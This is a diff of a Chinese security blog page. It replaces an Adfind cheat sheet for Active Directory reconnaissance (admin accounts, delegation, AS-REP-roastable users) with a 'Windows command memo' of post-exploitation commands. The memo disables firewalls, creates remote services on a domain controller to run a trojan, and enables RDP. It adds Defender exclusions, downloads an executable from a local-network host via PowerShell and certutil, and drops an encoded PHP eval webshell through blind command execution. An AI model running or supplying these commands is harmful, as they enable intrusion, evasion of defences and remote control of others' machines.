@@ -4,9 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Adfind 常用命令, Zh0um1&#39;s Blog">
-    <meta name="description" content="下载地址http://www.joeware.net/freetools/tools/adfind/index.htm
-常用命令查找受 AD 保护的域中的所有用户Adfind.exe -b DC=domain,DC=com -f &#34;&amp;amp">
+    <meta name="keywords" content="Windwos 命令备忘录, Zh0um1&#39;s Blog">
+    <meta name="description" content="netsh 关闭防火墙netsh advfilewall set publicprofile state off
+netsh advfirewall set allprofiles state off
+
+netsh 端口转发# 开启转发
+n">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Adfind 常用命令 | Zh0um1&#39;s Blog</title>
+    <title>Windwos 命令备忘录 | Zh0um1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -203,12 +206,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Adfind 常用命令</h1>
+                    <h1 class="description center-align post-title">Windwos 命令备忘录</h1>
                 </div>
             </div>
         </div>
@@ -324,8 +327,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Tools/">
-                                <span class="chip bg-color">Tools</span>
+                            <a href="/tags/Windows/">
+                                <span class="chip bg-color">Windows</span>
                             </a>
                         
                     </div>
@@ -340,7 +343,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-04-03
                 </div>
                 
 
@@ -364,34 +367,75 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p>
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查找受-AD-保护的域中的所有用户"><a href="#查找受-AD-保护的域中的所有用户" class="headerlink" title="查找受 AD 保护的域中的所有用户"></a>查找受 AD 保护的域中的所有用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=person)(samaccountname=*)(admincount=1)"</span> -dn</code></pre>
+                <h1 id="netsh-关闭防火墙"><a href="#netsh-关闭防火墙" class="headerlink" title="netsh 关闭防火墙"></a>netsh 关闭防火墙</h1><pre class="language-none"><code class="language-none">netsh advfilewall set publicprofile state off
+netsh advfirewall set allprofiles state off</code></pre>
 
-<h2 id="查找域中受-AD-保护的所有组"><a href="#查找域中受-AD-保护的所有组" class="headerlink" title="查找域中受 AD 保护的所有组"></a>查找域中受 AD 保护的所有组</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=group)(admincount=1)"</span> -dn</code></pre>
+<h1 id="netsh-端口转发"><a href="#netsh-端口转发" class="headerlink" title="netsh 端口转发"></a>netsh 端口转发</h1><pre class="language-none"><code class="language-none"># 开启转发
+netsh interface portproxy add v4tov4 listenaddress&#x3D;LOCAL_ADDRESS listenport&#x3D;LOCAL_PORT connectaddress&#x3D;DEST_ADDRESS connectport&#x3D;DEST_PORT
 
-<h2 id="查看域管账户"><a href="#查看域管账户" class="headerlink" title="查看域管账户"></a>查看域管账户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind -default -f <span class="token string">"(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))"</span> -dn</code></pre>
+# 查看存在的转发
+netsh interface portproxy show all
 
-<h2 id="列出域控制器名称"><a href="#列出域控制器名称" class="headerlink" title="列出域控制器名称"></a>列出域控制器名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc dclist</code></pre>
+# 删除指定规则
+netsh interface portproxy delete v4tov4 listenport&#x3D;LOCAL_PORT listenaddress&#x3D;LOCAL_ADDRESS</code></pre>
 
-<h2 id="查看域控版本"><a href="#查看域控版本" class="headerlink" title="查看域控版本"></a>查看域控版本</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -schema -s base objectversion</code></pre>
+<h1 id="sc-创建服务"><a href="#sc-创建服务" class="headerlink" title="sc 创建服务"></a>sc 创建服务</h1><p>基本用法</p>
+<pre class="language-none"><code class="language-none">sc create &lt;SERVICE_NAME&gt; binpath&#x3D; &quot;&lt;COMMEND&gt;&quot;
+sc description &lt;SERVICE_NAME&gt;   &quot;DESCRIPTION&quot; 设置服务的描述字符串 
+sc config &lt;SERVICE_NAME&gt;   start&#x3D; auto  设置这个服务为自动启动 
+net start &lt;SERVICE_NAME&gt;   启动服务</code></pre>
 
-<h2 id="查看域内在线的计算机"><a href="#查看域内在线的计算机" class="headerlink" title="查看域内在线的计算机"></a>查看域内在线的计算机</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -sc computers_active name operatingSystem</code></pre>
+<p>可以通过 IPC 连接在远程主机上创建服务</p>
+<pre class="language-none"><code class="language-none"># 关闭域控防火墙
+sc \\\\DC create wall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;
+sc \\\\DC start wall
+# 执行木马
+sc \\\\DC create shell binpath&#x3D; &quot;c:\\shell.exe&quot;
+sc \\\\DC start shell</code></pre>
 
-<h2 id="查看域内-GPO-信息"><a href="#查看域内-GPO-信息" class="headerlink" title="查看域内 GPO 信息"></a>查看域内 GPO 信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc gpodmp</code></pre>
+<h1 id="开关-3389-端口"><a href="#开关-3389-端口" class="headerlink" title="开关 3389 端口"></a>开关 3389 端口</h1><pre class="language-none"><code class="language-none"># 开启
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f
+# 关闭
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</code></pre>
 
-<h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="查询用户"><a href="#查询用户" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre>
+<h1 id="开关-RDP"><a href="#开关-RDP" class="headerlink" title="开关 RDP"></a>开关 RDP</h1><pre class="language-none"><code class="language-none"># 开启
+wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
+# 关闭
+wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre>
 
-<h3 id="查询主机"><a href="#查询主机" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre>
+<h1 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h1><pre class="language-none"><code class="language-none">Rundll32.exe user32.dll，LockWorkStation</code></pre>
 
-<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="查询用户-1"><a href="#查询用户-1" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre>
+<h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><pre class="language-none"><code class="language-none">certutil.exe -urlcache -split -f [URL] output.file
 
-<h3 id="查询主机-1"><a href="#查询主机-1" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre>
+# base64解码
+certutil.exe -decode encode.file decode.file</code></pre>
 
-<h2 id="查看域内高权限的-SPN-服务主体名称"><a href="#查看域内高权限的-SPN-服务主体名称" class="headerlink" title="查看域内高权限的 SPN 服务主体名称"></a>查看域内高权限的 SPN 服务主体名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"&amp;(servicePrincipalName=*)(admincount=1)"</span> servicePrincipalName</code></pre>
+<h1 id="查询-defender-白名单路径"><a href="#查询-defender-白名单路径" class="headerlink" title="查询 defender 白名单路径"></a>查询 defender 白名单路径</h1><pre class="language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\windows Defender\Exclusions\Paths&quot;</code></pre>
 
-<h2 id="查看可-AS-REP-Roasting-用户"><a href="#查看可-AS-REP-Roasting-用户" class="headerlink" title="查看可 AS-REP Roasting 用户"></a>查看可 AS-REP Roasting 用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"useraccountcontrol:1.2.840.113556.1.4.803:=4194304"</span> -dn</code></pre>
+<h1 id="修改-defender-白名单"><a href="#修改-defender-白名单" class="headerlink" title="修改 defender 白名单"></a>修改 defender 白名单</h1><pre class="language-none"><code class="language-none">Add-MpPreference -ExclusionPath &quot;C:\Utils&quot; # 添加白名单路径
+Add-MpPreference -ExclusionExtension &quot;C:\Utils\veil.exe&quot; # 添加白名单程序</code></pre>
 
-<h2 id="导出整个域的-ACL"><a href="#导出整个域的-ACL" class="headerlink" title="导出整个域的 ACL"></a>导出整个域的 ACL</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc getacls -sddlfilter <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -recmute</code></pre>
+<h1 id="PowerShell-下载远程文件"><a href="#PowerShell-下载远程文件" class="headerlink" title="PowerShell 下载远程文件"></a>PowerShell 下载远程文件</h1><pre class="language-none"><code class="language-none">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8000&#x2F;win.exe&#39;,&#39;C:\win.exe&#39;)</code></pre>
+
+<h1 id="替换文件中部分内容并写入到原文件"><a href="#替换文件中部分内容并写入到原文件" class="headerlink" title="替换文件中部分内容并写入到原文件"></a>替换文件中部分内容并写入到原文件</h1><pre class="language-none"><code class="language-none">powershell ((cat C:\Users\administrator\Desktop\info.txt) -replace &#39;somethings&#39;, &#39;anothor things&#39;) | set-content -path C:\Users\administrator\Desktop\info.txt</code></pre>
+
+<h1 id="PowerShell-中使用其他用户身份执行命令"><a href="#PowerShell-中使用其他用户身份执行命令" class="headerlink" title="PowerShell 中使用其他用户身份执行命令"></a>PowerShell 中使用其他用户身份执行命令</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$passwd</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"PASSWORD"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
+<span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token punctuation">(</span><span class="token string">"DOMAIN\USERNAME"</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 执行命令</span>
+<span class="token function">Invoke-Command</span> <span class="token operator">-</span>computername localhost <span class="token punctuation">[</span><span class="token operator">-</span>ConfigurationName dc_manage<span class="token punctuation">]</span> <span class="token operator">-</span>credential <span class="token variable">$cred</span> <span class="token operator">-</span>command <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>
+<span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName localhost <span class="token operator">-</span>Credential <span class="token variable">$cred</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span></code></pre>
+
+<h1 id="查找指定文件"><a href="#查找指定文件" class="headerlink" title="查找指定文件"></a>查找指定文件</h1><p>递归查询 C 盘下 index.html 文件路径</p>
+<pre class="language-none"><code class="language-none">dir &#x2F;s &#x2F;b c:\index.html</code></pre>
+
+<p>对无回显 RCE 的 web 机器可以通过配合该命令将命令执行结果写入到文件中，达到半回显效果</p>
+<p>写入命令执行结果</p>
+<pre class="language-none"><code class="language-none">for &#x2F;f %i in (&quot;dir &#x2F;s &#x2F;b c:\index.html&quot;) do (whoami &gt; %i\..\whoami.txt)</code></pre>
+
+<p>写入一句话马</p>
+<pre class="language-none"><code class="language-none">for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\1.jpg&#39;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA&#x2F;Pgo&#x3D; &gt; %i\..\base64.txt)
+for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\base64.txt&#39;) do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)</code></pre>
                 
             </div>
             <hr/>
@@ -417,7 +461,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Zh0um1.github.io/posts/1385ebc">http://Zh0um1.github.io/posts/1385ebc</a>
+                    <a href="http://Zh0um1.github.io/posts/cfde7db2">http://Zh0um1.github.io/posts/cfde7db2</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -455,8 +499,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Tools/">
-                                    <span class="chip bg-color">Tools</span>
+                                <a href="/tags/Windows/">
+                                    <span class="chip bg-color">Windows</span>
                                 </a>
                             
                         </div>
@@ -504,62 +548,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/5beaca16">
+                <a href="/posts/cfde7db2">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="MSSQL 一般利用方式">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Windwos 命令备忘录">
                         
-                        <span class="card-title">MSSQL 一般利用方式</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Zh0um1
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/MSSQL/">
-                        <span class="chip bg-color">MSSQL</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/1385ebc">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Adfind 常用命令">
-                        
-                        <span class="card-title">Adfind 常用命令</span>
+                        <span class="card-title">Windwos 命令备忘录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -570,7 +570,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-03
                             </span>
                         <span class="publish-author">
                             
@@ -584,8 +584,57 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Tools/">
-                        <span class="chip bg-color">Tools</span>
+                    <a href="/tags/Windows/">
+                        <span class="chip bg-color">Windows</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/53b8e68">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="MYSQL 关键字过滤 Bypass">
+                        
+                        <span class="card-title">MYSQL 关键字过滤 Bypass</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Zh0um1
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/MYSQL/">
+                        <span class="chip bg-color">MYSQL</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
                     </a>
                     
                 </div>
